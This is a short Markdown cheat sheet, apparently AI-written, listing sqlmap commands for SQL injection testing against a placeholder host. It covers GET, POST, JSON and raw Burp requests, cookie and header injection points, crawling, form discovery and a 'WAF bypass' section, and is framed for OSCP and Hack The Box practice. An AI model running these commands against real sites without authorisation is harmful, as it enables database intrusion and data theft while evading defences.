# SQLMap HTTP Request Runbook

## 1. Fastest Setup (Recommended)
Use **Browser DevTools → Network → Copy as cURL**

```bash
sqlmap 'http://target.com/?id=1' \
  -H 'User-Agent: Mozilla/5.0' \
  -H 'Cookie: PHPSESSID=xxxx'
````

👉 Replace `curl` with `sqlmap`

---

## 2. GET Parameters

```bash
sqlmap -u 'http://target.com/?id=1'
```

Test specific parameter:

```bash
sqlmap -u 'http://target.com/?id=1' -p id
```

---

## 3. POST Parameters

```bash
sqlmap -u 'http://target.com/' --data 'id=1&name=test'
```

Mark injection point:

```bash
sqlmap -u 'http://target.com/' --data 'id=1*&name=test'
```

---

## 4. Full HTTP Request (Burp / Complex Requests)

Save raw request to file:

```http
GET /?id=1 HTTP/1.1
Host: target.com
Cookie: PHPSESSID=xxxx
```

Run:

```bash
sqlmap -r req.txt
```

---

## 5. Cookies / Headers

```bash
sqlmap ... --cookie='PHPSESSID=xxxx'
```

Or:

```bash
sqlmap ... -H 'Cookie: PHPSESSID=xxxx'
```

---

## 6. Evasion / WAF Bypass

```bash
sqlmap ... --random-agent
```

Mobile UA:

```bash
sqlmap ... --mobile
```

---

## 7. Non-GET/POST Methods

```bash
sqlmap -u http://target.com --data='id=1' --method PUT
```

---

## 8. JSON / XML Requests

Simple:

```bash
sqlmap -u http://target.com --data '{"id":1}'
```

Complex (recommended):

```bash
sqlmap -r req.txt
```

---

## 9. Header Injection

```bash
sqlmap -u http://target.com --cookie="id=1*"
```

---

## 10. Auto-Discovery

```bash
sqlmap -u http://target.com --crawl=2
sqlmap -u http://target.com --forms
```

---



If you want, I can compress this further into a **1-page OSCP/HTB cheatsheet** or tailor it for **AD-backed apps**.
```
